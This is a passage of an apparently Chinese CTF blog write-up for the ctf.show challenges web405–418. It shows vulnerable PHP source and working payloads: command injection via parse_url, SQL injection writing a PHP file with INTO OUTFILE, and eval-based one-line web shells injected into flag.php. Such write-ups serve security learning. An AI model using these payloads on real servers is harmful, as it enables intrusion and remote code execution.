class="keyword">echo</span> <span class="string">&#x27;parse_url 好强大&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">parse_url 好强大</span><br></pre></td></tr></table></figure><p>这里的话要满足host  path  scheme   三个条件</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=httphp:<span class="comment">//127.0.0.1111;echo `cat f*`&gt;1.txt;11/a</span></span><br></pre></td></tr></table></figure><p>这里是<strong>scheme://host/path</strong></p><p>记住这个格式就好</p><p><img src="../images/image-20230330224805520.png" alt="image-20230330224805520"></p><p>所以就能绕过</p><h2 id="web406"><a href="#web406" class="headerlink" title="web406"></a>web406</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-16 16:00:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="comment">//flag in db</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$url</span>,FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from links where url =&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;不通过&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: url in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">17</span></span><br><span class="line">不通过</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/kuaile1314/p/12319042.html">filter_var()绕过</a></p><p>这里是添加了sql语句来的，与上面给的文章说的内容不同，给的文章是利用JavaScript绕过</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span> =<span class="string">&#x27;select flag from flag into outfile &quot;/var/www/html/1.txt&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">转为<span class="number">16</span>进制</span><br><span class="line">http:<span class="comment">//a53d40ee-9871-49a0-8f4a-5463bc97e052.chall.ctf.show/?url=0://www.baidu.com;&#x27;union/**/select/**/1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c203d2773656c65637420666c61672066726f6d20666c616720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f312e74787422273b24726573756c74203d2024636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b203f3e/**/into/**/outfile/**/&quot;/var/www/html/4.php&quot;%23</span></span><br><span class="line"></span><br><span class="line">访问<span class="number">1</span>.txt即可</span><br><span class="line">转化为<span class="number">16</span>进制绕过filter检测</span><br></pre></td></tr></table></figure><p>这里就是先把当</p><p><img src="../images/image-20230331155504698.png" alt="image-20230331155504698"></p><p>就会执行sql语句，然后把payload写到4.php上，然后访问4.php就会执行payload写的语句，然后访问1.txt就行了</p><h2 id="web407"><a href="#web407" class="headerlink" title="web407"></a>web407</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="linespan class="meta">?&gt;</span><span class="string">&quot;@123.php</span></span><br></pre></td></tr></table></figure><p>绕过的原因是<strong>非法字符可以放在双引号里面绕过检测</strong></p><p>这里用短标签的意思是因为，不能有空格，因为有个双引号然后浏览器会把空格<a href="https://so.csdn.net/so/search?q=转义&amp;spm=1001.2101.3001.7020">转义</a>为%20，然后因为双引号包含，最后导致写不进文件</p><h2 id="web409"><a href="#web409" class="headerlink" title="web409"></a>web409</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="linespan class="meta">?&gt;</span><span class="string">&quot;@123.com</span></span><br><span class="line"><span class="string">然后post数据</span></span><br><span class="line"><span class="string">1=cat /flag</span></span><br></pre></td></tr></table></figure><p>会把”flag给替换成空，然后就会执行eval(system($_POST[1]);?&gt;)</p><p>这里执行虽然会报错，但是还是能执行的</p><h2 id="web410"><a href="#web410" class="headerlink" title="web410"></a>web410</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 13:12:41</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.w3school.com.cn/php/filter_validate_boolean.asp">参考文章</a></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b=yes</span><br></pre></td></tr></table></figure><h2 id="web411"><a href="#web411" class="headerlink" title="web411"></a>web411</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 13:12:41</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span> ||<span class="variable">$b</span>==<span class="string">&#x27;on&#x27;</span> || <span class="variable">$b</span>==<span class="string">&#x27;ON&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b=yes</span><br></pre></td></tr></table></figure><h2 id="web412"><a href="#web412" class="headerlink" title="web412"></a>web412</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 16:19:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;//&#x27;</span>.<span class="variable">$ctfshow</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])<span class="meta">?&gt;</span>;&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(‘cat flag.php’);</span><br></pre></td></tr></table></figure><p>因为就是题目的代码都是只有&lt;?php 而没有结尾，所以我们就可以通过写</p><p>?&gt;给前面代码给包含了，然后就绕过注释了，然后后面在自己加一句话木马进去到flag.php里就行了</p><p><img src="../images/image-20230331171044704.png" alt="image-20230331171044704"></p><p><img src="../images/image-20230331171032907.png" alt="image-20230331171032907"></p><p>这就是为什么不会覆盖掉原有的flag的原因</p><h2 id="web413"><a href="#web413" class="headerlink" title="web413"></a>web413</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 16:19:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;/*&#x27;</span>.<span class="variable">$ctfshow</span>.<span class="string">&#x27;*/&#x27;</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure><p>原理差不多，就是绕过过滤,就是包含注释就行</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="comment">/*</span></span><br></pre></td></tr></table></figure><h2 id="web414"><a href="#web414" class="headerlink" title="web414"></a>web414</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 16:43:53</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>==<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sqrt</span>(<span class="variable">$ctfshow</span>)&gt;=<span class="title function_ invoke__">sqrt</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$flag</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure><p>这里的sqrt是计算平方根的意思</p><p><strong>布尔值true和任意字符串都弱相等</strong></p><p>intval($flag)    ——-&gt;   0</p><p>所以随便传个负值就行了</p><h2 id="web415"><a href="#web415" class="headerlink" title="web415"></a>web415</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 19:15:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$k</span> = <span class="variable">$_GET</span>[k];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$k</span>==<span class="string">&#x27;getflag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$k</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>== ：弱等于。在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。</p><p>若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串（例如”aaa”是不能转换为数字的字符串，而”123”或”123aa”就是可以转换为数字的字符串）或null，则转换为0</p><p><strong>函数名、方法名、类名 不区分大小写</strong></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?k=Getflag</span><br></pre></td></tr></table></figure><h2 id="web416"><a href="#web416" class="headerlink" title="web416"></a>web416</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 19:54:23</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;fake flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span> <span class="keyword">extends</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="variable">$_GET</span>[f]);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230331222734499.png" alt="image-20230331222734499"></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=cft::<span class="variable constant_">flag</span></span><br></pre></td></tr></table></figure><h2 id="web417"><a href="#web417" class="headerlink" title="web417"></a>web417</h2><p>题目</p><p>这里下载下来题目给的php代码，然后解码得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$c</span>==<span class="string">&#x27;show&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf=show</span><br></pre></td></tr></table></figure><h2 id="web418"><a href="#web418" class="headerlink" title="web418"></a>web418</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 